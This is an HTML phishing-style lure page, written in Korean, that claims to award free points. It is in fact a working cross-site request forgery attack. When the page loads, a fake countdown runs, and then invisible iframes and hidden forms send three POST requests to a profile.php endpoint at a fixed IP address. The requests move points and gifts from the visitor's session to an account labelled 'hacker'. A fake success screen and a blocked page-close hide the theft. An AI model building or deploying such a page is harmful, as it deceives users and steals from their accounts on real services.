<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px;
            width: 90%;
        }
        .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .subtitle { font-size: 1.2em; margin-bottom: 30px; opacity: 0.9; }
        .countdown { font-size: 3em; color: #FFD700; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); margin: 20px 0; }
        .progress-bar { width: 100%; height: 20px; background: rgba(255,255,255,0.3); border-radius: 10px; overflow: hidden; margin: 20px 0; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #00ff88, #00cc6a); width: 0%; transition: width 0.5s ease; border-radius: 10px; }
        .success { color: #00FF88; font-size: 1.8em; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .pulse { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        
        /* 숨겨진 iframe들 */
        .hidden-frames { position: absolute; left: -9999px; top: -9999px; }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title pulse">🎁 특별 이벤트!</h1>
        <p class="subtitle">무료 포인트 지급 시스템에 연결되었습니다</p>
        
        <div id="loading-section">
            <div class="loading">
                <p>💰 포인트 지급을 준비하고 있습니다...</p>
                <p class="countdown" id="countdown">3</p>
                <p>초 후 자동으로 포인트가 지급됩니다!</p>
            </div>
            <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
            <p id="status">🔄 시스템 연결 중...</p>
        </div>
        
        <div id="success-section" style="display: none;">
            <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
            <p style="font-size: 1.3em; margin: 20px 0;">💰 150P가 성공적으로 지급되었습니다!</p>
            <p style="opacity: 0.8;">포인트는 즉시 계정에 반영됩니다.</p>
        </div>
    </div>

    <!-- 숨겨진 iframe 컨테이너 -->
    <div class="hidden-frames" id="iframeContainer"></div>

    <script>
        let countdown = 3;
        const countdownEl = document.getElementById('countdown');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progressBar');
        const loadingSection = document.getElementById('loading-section');
        const successSection = document.getElementById('success-section');
        const iframeContainer = document.getElementById('iframeContainer');
        
        const statusMessages = [
            '🔄 서버에 연결하고 있습니다...',
            '🔐 보안 인증을 확인하고 있습니다...',
            '💰 포인트 지급 시스템을 준비하고 있습니다...'
        ];
        
        let messageIndex = 0;
        let attackCount = 0;
        
        // 파일 열리자마자 바로 카운트다운 시작
        const countdownTimer = setInterval(() => {
            countdown--;
            countdownEl.textContent = countdown;
            progressBar.style.width = ((3-countdown) * 33) + '%';
            
            if (messageIndex < statusMessages.length) {
                statusEl.textContent = statusMessages[messageIndex++];
            }
            
            if (countdown <= 0) {
                clearInterval(countdownTimer);
                executeIframeAttack();
            }
        }, 1000);
        
        // iframe 방식 CSRF 공격 (완전 자동화)
        function executeIframeAttack() {
            console.log('🎯 iframe 방식 CSRF 공격 시작!');
            statusEl.textContent = '💸 실제 포인트를 전송하고 있습니다...';
            progressBar.style.width = '100%';
            
            // 공격 데이터들
            const attacks = [
                {
                    receiver_id: '13',
                    points: '50',
                    send_gift: '1',
                    gift_type: 'coffee',
                    message: '🔥 iframe 공격 1번! 털렸다!'
                },
                {
                    receiver_id: '13', 
                    points: '30',
                    send_gift: '1',
                    gift_type: 'cake',
                    message: '🔥 iframe 공격 2번! 개털렸죠?'
                },
                {
                    receiver_id: '13',
                    points: '25', 
                    send_gift: '1',
                    gift_type: 'flower',
                    message: '🔥 iframe 공격 3번! 내가 가져간다!'
                }
            ];
            
            // 연속 공격 실행
            attacks.forEach((attackData, index) => {
                setTimeout(() => {
                    launchIframeAttack(attackData, index + 1);
                }, index * 2000); // 2초 간격
            });
            
            // 완료 처리
            setTimeout(() => {
                showSuccess();
                console.log('🎉 모든 iframe 공격 완료!');
                console.log('💰 총 105P 전송 완료!');
                console.log('🏴‍☠️ hacker 계정 확인해보세요!');
            }, 8000);
        }
        
        // 개별 iframe 공격 실행
        function launchIframeAttack(attackData, attackNum) {
            console.log(`🚀 iframe 공격 ${attackNum} 시작: ${attackData.points}P`);
            
            // 숨겨진 iframe 생성
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.style.width = '0';
            iframe.style.height = '0';
            iframe.style.border = 'none';
            iframe.name = `attack_frame_${attackCount}`;
            iframe.id = `attack_frame_${attackCount}`;
            
            // iframe 로드 완료 이벤트
            iframe.onload = function() {
                console.log(`✅ iframe 공격 ${attackNum} 전송 완료!`);
                statusEl.textContent = `💸 공격 ${attackNum} 완료 - ${attackData.points}P 전송됨!`;
            };
            
            iframe.onerror = function() {
                console.log(`⚠️ iframe 공격 ${attackNum} 전송됨 (에러 무시)`);
            };
            
            iframeContainer.appendChild(iframe);
            
            // 폼 생성
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://3.35.218.180/profile.php';
            form.target = `attack_frame_${attackCount}`;
            form.style.display = 'none';
            
            // 폼 데이터 추가
            Object.keys(attackData).forEach(key => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = attackData[key];
                form.appendChild(input);
            });
            
            // 폼을 body에 추가하고 즉시 전송
            document.body.appendChild(form);
            form.submit();
            
            console.log(`📤 POST 데이터 전송: receiver_id=${attackData.receiver_id}, points=${attackData.points}`);
            
            // 3초 후 폼 정리 (iframe은 유지)
            setTimeout(() => {
                if (form.parentNode) {
                    document.body.removeChild(form);
                }
            }, 3000);
            
            attackCount++;
        }
        
        function showSuccess() {
            loadingSection.style.display = 'none';
            successSection.style.display = 'block';
            document.title = '✅ 포인트 지급 완료!';
            
            // 성공 후 iframe들 정리
            setTimeout(() => {
                iframeContainer.innerHTML = '';
                console.log('🧹 iframe 정리 완료');
            }, 5000);
        }
        
        // 페이지 언로드 방지 (공격 중에)
        let preventUnload = true;
        window.addEventListener('beforeunload', function(e) {
            if (preventUnload) {
                e.preventDefault();
                return '포인트 지급이 진행 중입니다. 페이지를 닫으면 포인트를 받을 수 없습니다!';
            }
        });
        
        // 10초 후 페이지 닫기 허용
        setTimeout(() => { 
            preventUnload = false; 
            console.log('🔓 페이지 닫기 허용됨');
        }, 12000);
        
        // 디버그 정보
        console.log('🎯 iframe 방식 CSRF 공격 페이지 로드!');
        console.log('📋 타겟: hacker (ID: 13)');
        console.log('💰 총 포인트: 105P (50+30+25)');
        console.log('🚀 3초 후 자동 실행!');
        console.log('🔧 iframe으로 세션 자동 유지!');
        
        // 추가 보안: 콘솔 메시지 숨기기
        setTimeout(() => {
            if (typeof console.clear === 'function') {
                // console.clear();
            }
        }, 15000);
    </script>
</body>
</html>
